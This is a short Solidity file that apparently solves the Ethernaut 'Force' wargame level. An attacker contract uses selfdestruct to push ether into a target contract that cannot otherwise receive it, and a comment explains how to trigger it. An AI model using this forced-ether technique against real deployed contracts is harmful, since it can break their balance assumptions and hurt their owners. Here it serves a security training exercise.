pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttacker {
  function transfer(address _target) payable public returns (bool){
    _target.send(thisbal());
    selfdestruct(_target);
    return true;
  }
  
  function thisbal() public view returns (uint256 balance) {
      return address(this).balance;
  }
}

//Call ForceAttacker.transfer("Contract Address") with some ETH